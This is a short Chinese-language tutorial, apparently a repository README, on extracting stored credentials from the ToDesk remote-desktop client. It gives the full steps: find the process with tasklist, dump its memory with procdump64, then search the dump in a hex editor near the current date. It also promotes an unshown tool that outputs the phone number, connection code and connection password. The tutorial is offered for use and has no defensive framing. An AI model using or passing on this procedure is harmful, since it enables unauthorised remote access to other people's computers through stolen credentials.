
### 0x01 🌟 前言
#### ToDesk 密码读取教程+工具

----------
### 0x02 🔍 读取PID
```bash
tasklist | find /I "ToDesk.exe"
```
#### 此时会出现两个程序，请找到非 Services 的 PID。
![image](https://github.com/user-attachments/assets/eb6316fa-0a91-4a3f-ba3f-cb3d54c12a74)


#### 使用 procdump64.exe，通过 cmd 输入以下命令：
```bash
procdump64.exe -accepteula -ma 你的PID
```
#### 你将得到一个类似 `ToDesk.exe_240909_163416.dmp` 的文件。
![image](https://github.com/user-attachments/assets/3f7e6115-50bc-4833-923e-c9d7724d85fc)


-----------
### 0x03 🛠 手动提取
#### 使用 010Editor 打开 dmp 文件并手动查找：
```bash
查找文本 - 今天的时间，例如 20240909，然后在二进制文件的上几行 就是要的内容
```
![image](https://github.com/user-attachments/assets/b1430af8-25b0-454f-b73b-9879cfa81e4b)

-----------
### 0x04 💻 软件提取
#### 为了方便，我编写了一个工具，输入日期并选择文件即可自动提取。
#### 提取内容包括：手机号、连接码、连接密码。
```bash
通过工具选择dmp文件后，即可输出所需信息
```

![image](https://github.com/user-attachments/assets/7f4f9f1e-75ee-4487-a8a6-c6c99fa1ae83)

